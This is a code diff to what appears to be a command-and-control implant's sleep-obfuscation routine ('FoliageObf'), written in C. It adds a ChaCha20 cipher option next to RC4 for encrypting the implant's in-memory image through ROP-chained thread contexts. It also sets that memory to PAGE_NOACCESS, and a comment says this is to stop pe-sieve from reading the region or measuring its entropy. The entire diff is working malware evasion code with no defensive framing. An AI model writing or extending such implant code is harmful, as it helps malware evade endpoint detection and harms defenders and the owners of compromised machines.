@@ -27,7 +27,7 @@ VOID FoliageObf(
 ) {
     USTRING             Key         = { 0 };
     USTRING             Rc4         = { 0 };
-    UCHAR               Random[16]  = { 0 };
+    UCHAR               Random[44]  = { 0 };  /* max for ChaCha20: 32-byte key + 12-byte nonce */
 
     HANDLE              hEvent      = NULL;
     HANDLE              hThread     = NULL;
@@ -73,12 +73,13 @@ VOID FoliageObf(
         TxtSize = Instance->Session.ModuleSize;
     }
 
-    // Generate random keys
-    for ( SHORT i = 0; i < 16; i++ )
-        Random[ i ] = RandomNumber32( );
+    /* Generate random key; length depends on cipher: 16 bytes for RC4, 44 bytes for ChaCha20 */
+    DWORD KeyLen = ( Instance->Config.Implant.SleepCipher == SLEEP_CIPHER_CHACHA20 ) ? 44 : 16;
+    for ( SHORT i = 0; i < (SHORT)KeyLen; i++ )
+        Random[ i ] = (UCHAR)RandomNumber32();
 
     Key.Buffer = &Random;
-    Key.Length = Key.MaximumLength = 0x10;
+    Key.Length = Key.MaximumLength = (WORD)KeyLen;
 
     Rc4.Buffer = ImageBase;
     Rc4.Length = Rc4.MaximumLength = ImageSize;
@@ -167,12 +168,12 @@ VOID FoliageObf(
                     // NtProtectVirtualMemory( NtCurrentProcess(), &Img, &Len, PAGE_READWRITE, NULL,  );
 
                     RopMemEnc->ContextFlags = CONTEXT_FULL;
-                    RopMemEnc->Rip  = U_PTR( Instance->Win32.SystemFunction032 );
+                    RopMemEnc->Rip  = U_PTR( Instance->Win32.SleepCipherFunc );
                     RopMemEnc->Rsp -= U_PTR( 0x1000 * 11 );
                     RopMemEnc->Rcx  = U_PTR( &Rc4 );
                     RopMemEnc->Rdx  = U_PTR( &Key );
                     *( PVOID* )( RopMemEnc->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = C_PTR( Instance->Win32.NtTestAlert );
-                    // SystemFunction032( &Rc4, &Key ); RC4 Encryption
+                    /* SleepCipherFunc( &Rc4, &Key ); Encryption */
 
                     // PAGE_NOACCESS: prevent pe-sieve from reading/measuring entropy of encrypted region
                     RopSetMemNA->ContextFlags = CONTEXT_FULL;
@@ -231,12 +232,12 @@ VOID FoliageObf(
 
                     // NOTE: thread image decryption
                     RopMemDec->ContextFlags = CONTEXT_FULL;
-                    RopMemDec->Rip  = U_PTR( Instance->Win32.SystemFunction032 );
+                    RopMemDec->Rip  = U_PTR( Instance->Win32.SleepCipherFunc );
                     RopMemDec->Rsp -= U_PTR( 0x1000 * 5 );
                     RopMemDec->Rcx  = U_PTR( &Rc4 );
                     RopMemDec->Rdx  = U_PTR( &Key );
                     *( PVOID* )( RopMemDec->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = C_PTR( Instance->Win32.NtTestAlert );
-                    // SystemFunction032( &Rc4, &Key ); Rc4 Decryption
+                    /* SleepCipherFunc( &Rc4, &Key ); Decryption */
 
                     // RW -> RX
                     RopSetMemRx->ContextFlags = CONTEXT_FULL;
